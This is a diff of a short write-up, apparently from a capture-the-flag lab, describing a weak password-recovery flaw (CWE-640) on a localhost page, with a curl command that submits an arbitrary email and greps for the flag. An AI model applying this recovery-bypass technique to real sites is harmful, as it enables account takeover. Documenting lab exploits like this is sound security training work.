@@ -1,19 +1,22 @@
 # Forgot My Password - Broken Authentication
 
 ## Vulnerability Type
+
 **OWASP A07:2021 - Identification and Authentication Failures** (CWE-640: Weak Password Recovery Mechanism)
 
 ## Summary
 
 page: `http://localhost:8081/index.php?page=recover`
 commands:
+
 ```bash
-curl -X POST "http://localhost:8081/index.php?page=recover" \
+curl "http://localhost:8081/index.php?page=recover" \
      -d "mail=anything@example.com&Submit=Submit" | grep flag
 ```
+
 Any email address that differs from the default returns the flag.
 
-## Exploitation 
+## Exploitation
 
 ```txt
 POST /index.php?page=recover HTTP/1.1
